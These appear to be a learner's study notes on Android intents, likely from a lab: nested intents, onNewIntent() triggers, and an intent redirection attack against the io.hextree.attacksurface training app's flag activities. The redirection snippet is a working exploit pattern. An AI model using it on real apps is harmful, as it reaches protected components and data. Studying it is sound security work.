# Intents

- [Interaction with Intents](#interaction-with-intents)
- [Activity Life Cycle](#activity-life-cycle)
- [Attacks](#attacks)
    - [Intent Redirection](#intent-redirection)


## Interaction with Intents
- **Commands to interact with intents**
    - `intent.setClassName(<Package_Name>,<Class_Name>);`
    - `startActivity(<Intent_Name>)`
    - `<Intent_Name>.setAction(<Action_Name>)`

- **Nested Intents**
```java
Intent intent3 = new Intent();
intent3.putExtra("reason","back");

Intent intent2 = new Intent();
intent2.putExtra("return",42);
intent2.putExtra("nextIntent",intent3);

Intent intent1 = new Intent();
intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
intent1.putExtra("android.intent.extra.INTENT",intent2);
startActivity(intent1);
```

## Activity Life Cycle

- Scenarios When `onNewIntent()` Is Triggered
    1. Activity Launched with `FLAG_ACTIVITY_SINGLE_TOP`:
        - If the activity is already running at the top of the back stack, and a new intent is sent to it with the `Intent.FLAG_ACTIVITY_SINGLE_TOP` flag, the system calls `onNewIntent()` instead of creating a new instance of the activity.
    2. Activity Configured with `launchMode="singleTop"`:

        - If the activity is declared in the `AndroidManifest.xml` file with the launchMode attribute set to `singleTop`, the system calls `onNewIntent()` when the activity is already at the top of the stack and receives a new intent.
        ```xml
        <activity
            android:name=".YourActivity"
            android:launchMode="singleTop" />
        ```

    3. Activity Declared as `singleTask` or `singleInstance`:

        - For activities declared with `launchMode="singleTask"` or `launchMode="singleInstance"`, `onNewIntent()` is called when the activity is already running in a task and a new intent is directed to it.
    4. Task Reuse (`Intent.FLAG_ACTIVITY_REORDER_TO_FRONT`):

        - If you launch an activity that is already in the back stack of the current task using the `FLAG_ACTIVITY_REORDER_TO_FRONT` flag, the system brings it to the front and calls `onNewIntent()`.

## Attacks
### Intent Redirection
- If we can control the intent input of the startActivity() function, it may lead to an intent redirection vulnerability.
```java
// Redirect to flag6 Activity
Intent intent3 = new Intent();
intent3.putExtra("reason","next");
intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");

Intent intent2 = new Intent();
intent2.putExtra("return",42);
intent2.putExtra("nextIntent",intent3);

Intent intent1 = new Intent();
intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
intent1.putExtra("android.intent.extra.INTENT",intent2);
startActivity(intent1);
```

> [!NOTE]
> `FLAG_GRANT_READ_URI_PERMISSION`: If set, the recipient of this Intent will be granted permission to perform read operations on the URI in the Intent's data and any URIs specified in its ClipData.